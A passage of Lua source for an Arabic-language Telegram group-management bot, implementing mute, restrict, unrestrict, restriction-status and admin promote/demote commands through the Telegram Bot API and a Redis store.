status  = '\n ◉ تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, start_function, nil)
return false
end
if text and text:match("^كتم (%d+)$") and Mod(msg) then
local userid = text:match("^كتم (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ◉ عذرا لا تستطيع كتم ( '..Rutba(userid,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
if text == ("الغاء كتم") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم الغاء كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء كتم @(.*)$") and Mod(msg) then
local username = text:match("^الغاء كتم @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم الغاء كتمه'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء كتم (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء كتم (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم الغاء كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم الغاء كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end

if text == ("تقيد") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n ◉ عذرا لا تستطيع تقيد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد @(.*)$") and Mod(msg) then
local username = text:match("^تقيد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع تقيد البوت ")
return false 
end
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n ◉ عذرا لا تستطيع تقيد ( '..Rutba(result.id_,msg.chat_id_)..' )')
return false 
end      
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
 
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم تقيده'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match('^تقيد (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*)$")}
function start_function(extra, result, success)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n ◉ عذرا لا تستطيع تقيد ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if text and text:match('^تقيد (%d+) (.*) @(.*)$') and Mod(msg) then
local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*) @(.*)$")}
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n ◉ عذرا لا تستطيع تقيد ( "..Rutba(result.id_,msg.chat_id_).." )")
else
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد (%d+)$") and Mod(msg) then
local userid = text:match("^تقيد (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n ◉ عذرا لا تستطيع تقيد ( '..Rutba(userid,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
------------------------------------------------------------------------
if text == ("الغاء تقيد") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم الغاء تقيد'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد @(.*)$") and Mod(msg) then
local username = text:match("^الغاء تقيد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم الغاء تقيد'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء تقيد (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم الغاء تقيد'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم الغاء تقيد'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text and text:match('^رفع القيود @(.*)') and Manager(msg) then 
local username = text:match('^رفع القيود @(.*)') 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if DevSoFi(msg) then
database:srem(bot_id..'GBan:User',result.id_)
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Gmute:User'..msg.chat_id_,result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم الغاء جميع القيود'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
else
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم الغاء جميع القيود'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
end
else
Text = ' ◉ المعرف غلط'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == "رفع القيود" and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if DevSoFi(msg) then
database:srem(bot_id..'GBan:User',result.sender_user_id_)
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم الغاء جميع القيود'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
else
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم الغاء جميع القيود'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match('^كشف القيود @(.*)') and Manager(msg) then 
local username = text:match('^كشف القيود @(.*)') 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if database:sismember(bot_id..'Muted:User'..msg.chat_id_,result.id_) then
Muted = 'مكتوم'
else
Muted = 'غير مكتوم'
end
if database:sismember(bot_id..'Ban:User'..msg.chat_id_,result.id_) then
Ban = 'محظور'
else
Ban = 'غير محظور'
end
if database:sismember(bot_id..'GBan:User',result.id_) then
GBan = 'محظور عام'
else
GBan = 'غير محظور عام'
end
Textt = " ◉ الحظر العام ← "..GBan.."\n ◉ الحظر ← "..Ban.."\n ◉ الكتم ← "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
else
Text = ' ◉ المعرف غلط'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end

if text == "كشف القيود" and Manager(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if database:sismember(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_) then
Muted = 'مكتوم'
else
Muted = 'غير مكتوم'
end
if database:sismember(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_) then
Ban = 'محظور'
else
Ban = 'غير محظور'
end
if database:sismember(bot_id..'GBan:User',result.sender_user_id_) then
GBan = 'محظور عام'
else
GBan = 'غير محظور عام'
end
if database:sismember(bot_id..'Gmute:User',result.sender_user_id_) then
Gmute = 'محظور عام'
else
Gmute = 'غير محظور عام'
end
Textt = " ◉ الحظر العام ← "..GBan.."\n ◉ الكتم العام ← "..Gmute.."\n ◉ الحظر ← "..Ban.."\n ◉ الكتم ← "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text == ("رفع مشرف") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉  العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉  الايدي ← `'..result.sender_user_id_..'`\n ◉  تم رفعه مشرف '
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مشرف @(.*)$") and Constructor(msg) then
local username = text:match("^رفع مشرف @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉  عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉  تم رفعه مشرف '
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, ' ◉  لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == ("تنزيل مشرف") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉  العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉  الايدي ← `'..result.sender_user_id_..'`\n ◉  تم تنزيله ادمن من الجروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مشرف @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل مشرف @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉  عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n ◉  العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉  تم تنزيله ادمن من الجروب'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '◉ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end


if text == ("رفع مشرف كامل") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉  العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ​◉ الايدي ← `'..result.sender_user_id_..'`\n ◉  تم رفعه مشرف بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مشرف كامل @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع مشرف @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉  عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n ◉  العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉  تم رفعه مشرف بكل الصلاحيات'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
else
send(msg.chat_id_, msg.id_, ' ◉  لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == ("تنزيل مشرف كامل") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉  العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉  الايدي ← `'..result.sender_user_id_..'`\n ◉  تم تنزيله ادمن من الجروب بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مشرف كامل@(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل مشرف @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n ◉  العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉  تم تنزيله ادمن من الجروب بكل الصلاحيات'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, ' ◉  لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
---------------------- بداء كشف المجموعة

----------------------------------------- انتهاء كشف المجموعة
